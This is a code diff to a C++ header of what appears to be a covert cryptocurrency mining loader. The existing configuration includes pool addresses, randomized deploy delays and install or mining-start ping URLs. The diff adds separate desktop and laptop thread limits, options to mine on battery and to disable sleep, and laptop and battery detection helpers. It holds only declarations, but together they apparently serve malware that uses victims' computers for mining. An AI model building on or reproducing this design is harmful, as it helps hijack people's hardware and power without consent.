@@ -5,6 +5,9 @@
 #include <iostream>
 #include <vector>
 #include <Windows.h>
+#include <powerbase.h>
+
+#pragma comment(lib, "PowrProf.lib")
 
 #define maxPoolsPerZone 4
 #define maxName 1024
@@ -13,7 +16,7 @@
 
 struct minerConfig
 {
-    uint64_t pointer = 15811494920322472813;
+    char pointer[65] = "69cab23ab30a641f4ca71d062ff514363fcc7ce600d9d2a0361e78dbfcdbf160";
 
     char addrs[maxAddrs][maxName];
 
@@ -36,7 +39,8 @@ struct minerConfig
 
     uint8_t customArgsNum;
 
-    uint8_t maxThreads;
+    uint8_t maxThreadsDesktop;
+    uint8_t maxThreadsLaptop;
     uint32_t L3CachePerThread;
     uint32_t lightModeRam;
 
@@ -45,6 +49,10 @@ struct minerConfig
 
     uint8_t minerDeployDelayMin;
     uint8_t minerDeployDelayMax;
+
+    bool heavyCalcDelay;
+    bool onBatteryMining;
+    bool disableSleep;
 
     bool configured;
 };
@@ -63,7 +71,8 @@ struct settings
     std::string installPingUrl;
     std::string miningStartPingUrl;
 
-    int maxThreads;
+    int maxThreadsDesktop;
+    int maxThreadsLaptop;
     int L3CachePerThread;
     int lightModeRam;
 
@@ -72,6 +81,10 @@ struct settings
 
     int minerDeployDelayMin;
     int minerDeployDelayMax;
+
+    bool heavyCalcDelay;
+    bool onBatteryMining;
+    bool disableSleep;
 
     std::string customArgs[maxCustomArgs];
 };
@@ -102,3 +115,9 @@ void generateSettings(minerConfig* mConfig, settings* settings);
 
 /*returns randomed int, tries to avoid exception supplied*/
 int randomAnInt(int min, int max, int exception = -1);
+
+/*returns true if device is a laptop, false if a desktop*/
+bool isLaptop();
+
+/*returns true if device runs on battery*/
+bool isRunningOnBattery();
